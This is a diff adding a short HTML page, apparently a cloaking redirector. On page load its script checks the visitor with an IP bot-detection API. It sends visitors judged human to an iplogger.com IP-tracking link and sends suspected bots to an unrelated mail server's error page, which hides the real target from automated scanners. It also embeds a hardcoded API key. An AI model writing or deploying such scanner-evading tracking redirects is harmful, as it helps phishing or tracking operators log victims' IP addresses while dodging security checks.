@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>IP Detection</title>
+</head>
+<body>
+    <script>
+        // Function to fetch IP information
+        function fetchIP() {
+            var apiKey = '948a17cf-23c8-4367-8175-0c6653049783'; // Replace 'api-key-here' with your actual API key
+            var url = 'https://api.ipdetective.io/ip';
+
+            // Fetch data from API
+            fetch(url, {
+                headers: {
+                    'x-api-key': apiKey
+                }
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('IP Information:', data);
+                if (data.bot === false) {
+                    // Redirect if not a bot
+                    window.location.href = 'https://iplogger.com/2Z5RT4';
+                } else {
+                    // Redirect if a bot
+                    window.location.href = 'https://email.southslope.net/error.php';
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        }
+
+        // Call the function when the page loads
+        window.onload = fetchIP;
+    </script>
+</body>
+</html>
